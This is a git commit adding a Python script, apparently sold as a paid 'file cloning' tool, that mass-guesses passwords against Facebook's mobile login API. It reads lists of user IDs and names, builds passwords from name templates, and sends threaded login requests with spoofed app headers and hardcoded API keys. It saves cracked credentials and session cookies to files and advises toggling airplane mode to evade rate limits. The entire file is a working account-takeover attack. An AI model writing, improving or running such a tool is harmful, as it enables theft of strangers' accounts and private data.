f1de966925098f05138be836944fdb3108b9a2ea
jrafael3205 <166350553+jrafael3205@users.noreply.github.com>
2024-04-28 08:15:51 +0800

    Add files via upload

---
+++ fleur.py
@@ -0,0 +1,359 @@
+#__________________[ IMPORT ]__________________#
+import os,zlib
+from os import system as osRUB
+from os import system as cmd
+os.system('clear')
+print(f'\x1b[38;5;46m[\x1b[1;97m=\x1b[38;5;46m] LOADING MODULES ')
+try:
+    import requests 
+except ImportError:
+    print(f'\x1b[38;5;46m[\x1b[1;97m=\x1b[38;5;46m] INSTALLING REQUESTS ')
+    os.system('pip install requests')
+try:
+    import concurrent.futures
+except ImportError:
+    print(f'\x1b[38;5;46m[\x1b[1;97m=\x1b[38;5;46m] INSTALLING FUTURES ')
+    os.system('pip install futures')
+try:
+    import mechanize
+except ModuleNotFoundError:
+    os.system('pip install mechanize > /dev/null')
+from urllib.request import Request, urlopen
+import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
+from concurrent.futures import ThreadPoolExecutor as Habib
+from string import * 
+from random import randint
+from time import sleep as slp
+from os import system as cmd
+from zlib import decompress 
+import os, platform
+from concurrent.futures import ThreadPoolExecutor
+fast_work = ThreadPoolExecutor(max_workers=15).submit
+
+from concurrent.futures import ThreadPoolExecutor
+fast_work = ThreadPoolExecutor(max_workers=15).submit
+def l():
+    vivo = random.choice(["U3", "1002T", "C", "1605", "730", "A5", "A54", "a57", "A87",
+    "C8818", "EGO", "E1", "E3", "E5", "X21", "X21i", "X2s", "X23",
+    "iQOO", "X5Max5", "X5V", "X60t", "X6S", "X7", "X70", "Xplay", "Xshot",
+    "Y01", "Y01A", "Y02", "Y02s", "V1", "V11", "V11s", "Y13T", "Nex",
+    "S1", "S10", "S11", "S11t", "S12", "S13", "S15", "S15e", "S1PRO",
+    "S20", "S21", "S31", "S5", "S6", "S6T", "S7", "S76", "S7e",
+    "S7t", "S7w", "S9", "S9e", "T1", "T1x", "T2", "T2x", "E1",
+    "U10", "U20", "X20", "X1w", "23x", "V77e", "Y613F", "Y628", "X3S",
+    "Z1", "Z10", "Z1i", "Z1LITE", "Z1PRO", "Z1x", "Z34"])
+    ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.48.'+'122;FBBV/'+str(random.randint(1111111,9999999))+';FBDM/{density=2'+'.0,width='+'720,height='+'1456};FBLC/it_IT;FBRV/273474118;FBCR/I TIM;FBMF/VIVO;FBBD/VIVO;FBPN/com.facebook.katana;FBDV/'+str(vivo)+';FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]'
+    return ua
+    
+#__________________[ LOOP ]__________________#
+totaldmp = 0
+count = 0
+loop = 0
+oks = []
+cps = []
+id = []
+ps = []
+sid = []
+total=[]
+methods = []
+srange = 0
+saved = []
+totaldmp = 0
+filter = []
+loop,ok,cp,user = 0,[],[],[]
+cok,plist = [],[]
+#__________________[ SYS ]__________________#
+sys.stdout.write('\x1b]2; FLEUR\x07')
+#__________________[ COLOUR ]__________________#
+A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;48m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;46m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
+#__________________[ LINEX ]__________________#
+def clear():os.system('clear');print(logo)
+def linex():print(f'{A}──────────────────────────────────────────────────')
+#__________________[ LOGO ]__________________#
+logo =f"""{A}
+
+     {G1}███████ ██████  ██████   ██████  ██████  
+     {G2}██      ██   ██ ██   ██ ██    ██ ██   ██ 
+     {G3}█████   ██████  ██████  ██    ██ ██████  
+     {G4}██      ██   ██ ██   ██ ██    ██ ██   ██ 
+     {G5}███████ ██   ██ ██   ██  ██████  ██   ██                     
+
+{A}──────────────────────────────────────────────────
+{G1}[{A}•{G1}]{G1} OWNER    {A}:{G1} FLEUR PRETTY
+{G1}[{A}•{G2}]{G2} FACEBOOK {A}:{G2} FLEUR
+{G1}[{A}•{G3}]{G3} TOOLTYPE {A}:{G3} FILE CLONING
+{G1}[{A}•{G4}]{G4} STATUS   {A}:{G4} PAID
+{A}──────────────────────────────────────────────────"""
+def approval():
+  uuid = str(os.geteuid())+"DS"+str(os.geteuid())
+  id = "TITE-"+"".join(uuid)
+  os.system('clear')
+  print(logo) 
+  print("\033[1;37m[\u001b[36m•\033[0;32m] You Need Approval To Use This Tool   \033[1;37m")
+  print("\033[1;37m[\u001b[36m•\033[0;32m] Your Key :\033[0;31m "+id);time.sleep(0.1)
+  print ("""\033[0;37m──────────────────────────────────────────────────""")
+  try:
+    httpCaht = requests.get("https://github.com/jrafael3205/test/blob/main/key.txt").text
+    if id in httpCaht:
+      print("\033[0;32m >> Your Key Has Been Approved !!!")
+      msg = str(os.geteuid())
+      time.sleep(1)
+      pass
+    else: 
+      print("\x1b\033[0;32m >> Send Key on Facebook");
+      time.sleep(0.1)
+      input(' >> Click Enter To Send Your Key ')
+      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://www.facebook.com/urfleurheinich='+tks),approval()      
+      time.sleep(1)
+      exit()
+      
+  except: 
+     print(" >> Unable To Fetch Data From Server ")
+     time.sleep(2)
+     exit()
+approval()
+
+def clear():
+        os.system('clear')
+        print(logo)
+#__________________[ RESULT ]__________________#
+def result(OKs,cps):
+    if len(OKs) != 0 or len(cps) != 0:
+        print(f'\r{A}──────────────────────────────────────────────────')
+        print(f'{G1}[{A}={G1}]{G1} THE PROCESS HAS BEEN COMPLETE...')
+        print(f'{G1}[{A}={G2}]{G2} TOTAL OK {A}:{G2} %s' % str(len(oks)))
+        print(f'{G1}[{A}={G2}]{G3} TOTAL CP {A}:{G3} %s' % str(len(cps)))
+        print(f'\r{A}──────────────────────────────────────────────────')
+        input(f"{G1}[{A}={G4}]{G4} PRESS ENTER TO BACK MENU ")
+        exit()
+#__________________[ MENU ]__________________#
+def menu():   
+    clear()
+    print(f'{G1}[{A}1{G1}]{G1} FILE CLONING')
+    print(f'{G1}[{A}2{G2}]{G2} CONTACT TOOL OWNER')
+    print(f'{G1}[{A}3{G3}]{G3} EXIT TOOLS')
+    linex()
+    select = input(f'{G1}[{A}?{G5}]{G5} CHOICE {A}:{G5} ')
+    if select =='1':
+        _file_()
+    elif select =='2':
+        os.system('xdg-open https://www.facebook.com/profile.php?id=100051353153084');menu()
+    elif select =='3':
+        exit(f'{G1}[{A}={G1}]{G1} EXIT DONE ')
+    else:
+        print(f'{G1}[{A}={G2}]{G2} VALID OPTION')
+        time.sleep(2)
+        menu()
+#__________________[ FILE ]__________________#      
+def _file_():
+    global methods
+    clear()
+    print(f'{G1}[{A}1{G1}]{G1} METHOD {G1}[{A}M1{G1}]{G1} ')
+    print(f'{G1}[{A}2{G2}]{G2} METHOD {G2}[{A}M2{G2}]{G1} ')
+    linex()
+    option = input(f'{G1}[{A}?{G3}]{G3} CHOICE {A}:{G3} ')
+    if option =='1':
+        methods.append('methodA')
+        main_crack().crack(id)
+    elif option =='2':
+        methods.append('methodB')
+        main_crack().crack(id)
+    elif option =='0':
+        _file_()
+    else:
+      print(f'{G1}[{A}={G2}]{G2} VALID OPTION')
+      #CENT(allkey)
+      time.sleep(2)
+      _file_()
+
+class main_crack():
+    def __init__(self):
+        self.id=[]
+    def crack(self,id):
+        global methods
+        clear()
+        print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} /sdcard/FLEUR.txt');linex()
+        self.file = input(f'{G1}[{A}?{G2}]{G2} FILE NAME {A}:{G2} ')
+        try:
+            self.id = open(self.file).read().splitlines()
+            self.pasw()
+        except FileNotFoundError:
+            print(f'{G1}[{A}={G2}]{G2} OPPS FILE NOT FOUND ...')
+            time.sleep(2)
+            os.system('clear')
+            print(logo)
+            print(f'{G1}[{A}={G2}]{G2} TRY AGAIN ...')
+            time.sleep(2)
+            main_crack().crack(id)
+#__________________[ FILE METHOD M1 ]__________________#           
+    def methodA(self, sid, name, psw):
+        try:
+            global oks,cps,loop
+            lo  = "Dalvik/2.1.0 (Linux; U; Android 13; SM-A346N Build/TP1A.400498.016) [FBAN/FB4A;FBAV/381.0.0.20.131;FBBV/20154701;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/TM;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A346N;FBSV/13;FBCA/armeabi-v7a:armeabi;]"
+            sys.stdout.write(f"\r{G1}[{A}FLEUR-M1{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
+            sys.stdout.flush()
+            fs = name.split(' ')[0]
+            try:
+                ls = name.split(' ')[1]
+            except:
+                ls = fs
+            for pw in psw:
+                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
+                with requests.Session() as session:
+                    data = {"adid": str(uuid.uuid4()),
+                    "format": "json",
+                    "device_id": str(uuid.uuid4()),
+                    "cpl": "true",
+                    "family_device_id": str(uuid.uuid4()),
+                    "credentials_type": "device_based_login_password",
+                    "error_detail_type": "button_with_disabled",
+                    "source": "device_based_login",
+                    "email": sid,
+                    "password": ps,
+                    "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
+                    "generate_session_cookies": "1",
+                    "meta_inf_fbmeta": "",
+                    "advertiser_id": str(uuid.uuid4()),
+                    "currently_logged_in_userid": "0",
+                    "locale": "en_GB",
+                    "client_country_code": "GB",
+                    "method": "auth.login",
+                    "fb_api_req_friendly_name": "authenticate",
+                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+                    "api_key": "882a8490361da98702bf97a021ddc14d"}
+                headers = {'User-Agent': lo,
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'Host': 'graph.facebook.com',
+                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+                    'X-FB-Connection-Type': 'MOBILE.LTE',
+                    'X-Tigon-Is-Retry': 'False',
+                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+                    'x-fb-device-group': '5120',
+                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+                    'X-FB-Request-Analytics-Tags': 'graphservice',
+                    'X-FB-HTTP-Engine': 'Liger',
+                    'X-FB-Client-IP': 'True',
+                    'X-FB-Server-Cluster': 'True',
+                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
+                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
+                if 'session_key' in q:
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);swagb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={swagb};{ckkk}"
+                    print(f"\r\r{G1}[FLEUR-OK] {sid} | {ps} ")
+                    open('/sdcard/SWAG-M1-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    oks.append(sid)
+                    break
+                elif 'www.facebook.com' in q['error']['message']:
+                     print(f"\r\r{M}[FATAY] {sid} | {ps} ")
+                     open('/sdcard/SWAG-M2-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
+                     cps.append(sid)
+                else:
+                    continue
+            loop+=1
+        except requests.exceptions.ConnectionError:
+            self.methodA(sid, name, ps)
+#__________________[ FILE METHOD M2 ]__________________#             
+    def methodB(self, sid, name, psw):
+        try:
+            global oks,cps,loop
+            sys.stdout.write(f"\r{G1}[{A}FLEUR-M2{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
+            sys.stdout.flush()
+            fs = name.split(' ')[0]
+            try:
+                ls = name.split(' ')[1]
+            except:
+                ls = fs
+            for pw in psw:
+                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
+                with requests.Session() as session:
+                    data = {"adid": str(uuid.uuid4()),
+                    "format": "json",
+                    "device_id": str(uuid.uuid4()),
+                    "cpl": "true",
+                    "family_device_id": str(uuid.uuid4()),
+                    "credentials_type": "device_based_login_password",
+                    "error_detail_type": "button_with_disabled",
+                    "source": "device_based_login",
+                    "email": sid,
+                    "password": ps,
+                    "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
+                    "generate_session_cookies": "1",
+                    "meta_inf_fbmeta": "",
+                    "advertiser_id": str(uuid.uuid4()),
+                    "currently_logged_in_userid": "0",
+                    "locale": "en_GB",
+                    "client_country_code": "GB",
+                    "method": "auth.login",
+                    "fb_api_req_friendly_name": "authenticate",
+                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+                    "api_key": "882a8490361da98702bf97a021ddc14d"}
+                headers = {'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 14; SM-T825Y Build/ILY42E) [FBAN/Orca-Android;FBAV/374.0.0.20.133;FBBV/24218031;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/0;FBCR/GLOBE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-T825Y;FBSV/14;FBCA/armeabi-v7a:armeabi;]',
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'Host': 'graph.facebook.com',
+                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+                    'X-FB-Connection-Type': 'MOBILE.LTE',
+                    'X-Tigon-Is-Retry': 'False',
+                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+                    'x-fb-device-group': '5120',
+                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+                    'X-FB-Request-Analytics-Tags': 'graphservice',
+                    'X-FB-HTTP-Engine': 'Liger',
+                    'X-FB-Client-IP': 'True',
+                    'X-FB-Server-Cluster': 'True',
+                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
+                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
+                if 'session_key' in q:
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);swagb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={swagb};{ckkk}"
+                    print(f"\r\r{G1}[FLEUR-OK] {sid} | {ps} ")
+                    open('/sdcard/SWAG-M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    oks.append(sid)
+                    break
+                elif 'www.facebook.com' in q['error']['message']:
+                    print(f"\r\r{M}[FATAY] {sid} | {ps} ")
+                    open('/sdcard/SWAG-M2-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
+                    cps.append(sid)
+                else:
+                    continue
+            loop+=1
+        except requests.exceptions.ConnectionError:
+            self.methodC(sid, name, ps)
+#__________________[ PASSWORD ]__________________#
+    def pasw(self):       
+            pw = []
+            clear()
+            print(f'{G1}[{A}={G2}]{G2} EXAMPLE {A}:{G2} 5 to 20');linex()
+            sl = int(input(f'{G1}[{A}?{G3}]{G3} PASSWORD LIMIT {A}:{G3} '))
+            clear()
+            print(f'{G1}[{A}?{G4}]{G4} EXAMPLE {A}:{G4} First Last/first last/firstlast')
+            linex()
+            if sl =='':
+                print(f'{G1}[{A}={G5}]{G5} PUT LIMIT BETWEEN 1 TO 30')
+            elif sl > 20:
+                print(f'{G1}[{A}={G1}]{G1} PASSWORD LIMIT SHOULD NOT BE GREATER THAN 30')
+            else:
+                for sr in range(sl):
+                    pw.append(input(f'{G1}[{A}={G1}]{G1} PASSWORD NO {G1}[{A}{sr+1}{G1}] {A}:{G1} '))
+            clear()
+            print(f'{G1}[{A}={G1}]{G1} TOTAL FILE UID {A}:{G1} %s ' % len(self.id))
+            print(f'{G1}[{A}={G2}]{G2} PASSWORD LIMIT {A}:{G1} {sl} ')
+            print(f'{G1}[{A}={G3}]{G3} TURN {G3}[{A}ON{A}/{A}OFF{G3}]{G3} AIRPLANE MODE EVERY {A}3{G3} MIN')
+            linex()
+            with Habib(max_workers=30) as FLEURworld:
+                for zsb in self.id:
+                   try:
+                       uid, name = zsb.split('|')
+                       sz = name.split(' ')
+                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
+                           pwx =  pw
+                       else:
+                            pwx =  pw
+                            if 'methodA' in methods:
+                                FLEURworld.submit(self.methodA, uid, name, pwx)
+                            elif 'methodB' in methods:
+                                FLEURworld.submit(self.methodB, uid, name, pwx)
+                   except:pass
+            result(oks,cps)
+          
+menu()
+#__________________[ END ]__________________#
